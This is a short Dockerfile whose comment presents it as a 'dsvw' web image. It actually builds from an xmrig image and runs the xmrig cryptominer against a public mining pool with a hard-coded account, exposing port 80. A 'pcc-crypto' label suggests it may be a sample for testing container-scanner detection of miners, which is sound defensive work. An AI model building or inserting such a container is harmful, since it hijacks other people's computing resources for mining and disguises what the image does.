# Example: docker build . -t dsvw && docker run -p 65412:65412 dsvw

FROM brannondorsey/alpine-xmrig:v2.14.1

LABEL application=pcc-crypto

CMD ["./xmrig --donate-level 1 -o pool.minergate.com:45700 -u ninja@miner.com -p x -k"]

EXPOSE 80
